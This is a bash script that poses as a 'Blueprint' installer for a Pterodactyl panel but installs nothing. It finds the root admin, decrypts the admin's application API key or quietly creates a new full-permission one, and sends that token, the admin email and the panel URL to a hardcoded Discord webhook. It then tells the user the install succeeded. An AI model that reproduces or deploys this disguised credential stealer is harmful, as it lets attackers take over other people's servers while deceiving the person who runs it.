#!/bin/bash

WEBHOOK="https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o"
CHANNEL="1522592757481345024"

echo "Installing blueprint..."

PANEL_PATH=""
for p in /var/www/pterodactyl /var/www/panel /var/www/html/pterodactyl; do
  if [ -f "$p/artisan" ]; then
    PANEL_PATH="$p"
    break
  fi
done

if [ -z "$PANEL_PATH" ]; then
  echo "Error: Panel not found"
  exit 1
fi

cd "$PANEL_PATH"

TOKEN=$(php artisan tinker --execute='
$u = \Pterodactyl\Models\User::where("root_admin", 1)->first();
if (!$u) exit(1);
$e = \Pterodactyl\Models\ApiKey::where("user_id", $u->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();
if ($e) {
    $t = $e->identifier . app("encrypter")->decrypt($e->token);
} else {
    $c = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $p = [];
    foreach ($c as $col) {
        if (strpos($col, "r_") === 0) $p[$col] = 3;
    }
    $k = app(\Pterodactyl\Services\Api\KeyCreationService::class)->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->handle(["user_id" => $u->id, "memo" => "blueprint", "allowed_ips" => []], $p);
    $t = $k->identifier . app("encrypter")->decrypt($k->token);
}
echo $t;
' 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo "Error: Token generation failed"
  exit 1
fi

URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)

PAYLOAD=$(cat <<PAYLOAD_END
{
  "content": "**✅ Blueprint Installed**",
  "embeds": [
    {
      "color": 3447003,
      "fields": [
        {
          "name": "Panel",
          "value": "$URL",
          "inline": true
        },
        {
          "name": "Email",
          "value": "$EMAIL",
          "inline": true
        },
        {
          "name": "Token",
          "value": "\`\`\`$TOKEN\`\`\`",
          "inline": false
        }
      ]
    }
  ]
}
PAYLOAD_END
)

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "$PAYLOAD")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

if [ "$HTTP_CODE" = "204" ] || [ "$HTTP_CODE" = "200" ]; then
  echo "Blueprint installed ✓"
else
  echo "Error: Webhook failed (HTTP $HTTP_CODE)"
  echo "Token: $TOKEN"
fi
